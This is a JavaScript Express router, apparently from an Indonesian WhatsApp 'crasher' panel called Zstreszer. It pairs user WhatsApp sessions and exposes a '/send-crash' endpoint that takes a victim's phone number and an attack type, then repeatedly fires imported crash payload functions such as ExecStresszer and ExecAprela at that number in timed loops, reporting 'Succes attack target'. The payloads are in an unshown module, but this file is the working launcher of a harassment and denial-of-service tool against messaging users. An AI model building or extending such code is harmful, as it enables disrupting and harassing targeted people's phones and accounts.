require("../../config");
const express = require('express');
const router = express.Router();
const path = require('path');
//================
const { requireOwner, requireLogin,checkLimit } = require('../lib/ServerF');
const { removeSessionFolder } = require('../lib/whatsapp');
const sessionFolderPath = path.join(__dirname, '../../sessions');
//================
//FUNC
const { 
overloadButtonGC, 
ExecStresszer1, 
ExecStresszer2, 
ExecAprela, 
ExecVialet, 
ExecAlbumInvis,
ExecAlbum
} = require('../lib/Xstres');
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
//============
router.get('/status-wa', requireLogin, (req, res) => {
const username = req.session.username;
const zstres = global.clientSessions[username];
if (zstres && zstres.user) {
return res.status(200).json({ connected: true });
} else {
return res.status(200).json({ connected: false });
}});
//============
router.get('/connected-wa', requireLogin, async (req, res) => {
const username = req.session.username; 
const isOwner = req.session.role === 'owner'; 
const data = global.connectedClients.filter(client => {
if (isOwner) {
return true;
} else {
return client.username === username;
}
}).map(client => {
const id = client.id;
const pushName = client.name || id;
return { username: client.username, id, pushName };
});
return res.status(200).json({ success: true, total: data.length, data });
});
//============
router.post('/logout-wa', requireLogin, async (req, res) => {
const { jid } = req.body;
if (!jid) {
return res.status(400).json({ success: false, message: 'JID mana? Lo pikir gue tukang tebak?' });
}
const index = global.connectedClients.findIndex(c => c.id === jid);
if (index === -1) {
return res.status(404).json({ success: false, message: 'User udah kabur atau gak ketemu, jangan ngeles!' });
}
const client = global.connectedClients[index];
const username = client.username;
const requester = req.session.username;
const requesterRole = req.session.role || 'user';
if (requesterRole !== 'owner' && requester !== username) {
return res.status(403).json({ success: false, message: 'Lo gak berhak logout bot ini, jangan sok jago!' });
}
const session = global.clientSessions[username];
try {
if (session && typeof session.logout === 'function') {
await session.logout();
}
delete global.clientSessions[username];
global.connectedClients.splice(index, 1);
await removeSessionFolder(path.join(sessionFolderPath, username), username);
return res.status(200).json({ success: true, message: `Logout dari ${jid} berhasil, jangan ganggu lagi ya!` });
} catch (error) {
console.error('Logout Error:', error);
return res.status(500).json({ success: false, message: 'Logout gagal, santai aja, coba lagi nanti!' });
}
});
//============
router.post('/connect-wa', requireLogin, checkLimit, async (req, res) => {
const username = req.session.username;
const zstres = global.clientSessions[username];
try {
if (!zstres) {
return res.status(500).json({ error: 'Instansi WhatsApp lo belum nyala, ngapain dipaksa?' });
}
if (zstres.user) {
return res.status(501).json({ error: 'WhatsApp lo udah nyambung, ngapain nyambung lagi, goblok!' });
}
const { nomor } = req.body;
if (!nomor) {
return res.status(400).json({ error: 'Nomor mana? Jangan sok pinter, isi dulu!' });
}
const code = await zstres.requestPairingCode(nomor.trim());
return res.json({ code });
} catch (err) {
console.error('Gagal request pairing', err);
return res.status(500).json({ error: 'Gagal dapetin pairing code, coba otak lo dulu!' });
}
});
//============
router.post('/send-crash', requireLogin, checkLimit, async (req, res) => {
const username = req.session.username;
const zstres = global.clientSessions[username];
try {
const { nomor, type } = req.body;
if (!nomor || !type) {
return res.status(400).json({ error: 'Nomor sama type lu gak lengkap, isi bener jangan sok!' });
}
if (!zstres || !zstres.user) {
return res.status(400).json({ error: 'WhatsApp lo belum connect, goblok! Jangan dipaksa!' });
}
const target = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
res.json({success: true,message: "Succes attack target"});
switch (type) {
case "testsend":
await zstres.sendMessage(target, { text: `> Zstreszer Always On` });
break;
case 'Aprela Invis':
for (let i = 0; i < 10; i++) {
await ExecAprela(target, zstres);
await sleep(5000);
await ExecAprela(target, zstres);
}
break;
case 'Violet Invis':
for (let i = 0; i < 12; i++) {
await ExecVialet(target, zstres);
await sleep(6000);
await ExecVialet(target, zstres);
}
break;
case 'Album Invis':
await ExecAlbumInvis(target, zstres);
await sleep(10000);
await ExecAlbumInvis(target, zstres);
await sleep(10000);
await ExecAlbumInvis(target, zstres);
break;
case 'ZstreszerV1':
for (let i = 0; i < 15; i++) {
await ExecStresszer1(target, zstres);
await sleep(8000);
await ExecStresszer1(target, zstres);
}
break;
case 'ZstreszerV2':
for (let i = 0; i < 16; i++) {
await ExecStresszer2(target, zstres);
await sleep(8000);
await ExecStresszer2(target, zstres);
await sleep(8000);
await ExecStresszer2(target, zstres);
}
break;
default:
break;
}
} catch (err) {
console.error('[SEND MESSAGE ERROR]', err);
res.status(500).json({ error: 'Gagal mengirim pesan' });
}
});
//================
module.exports = router;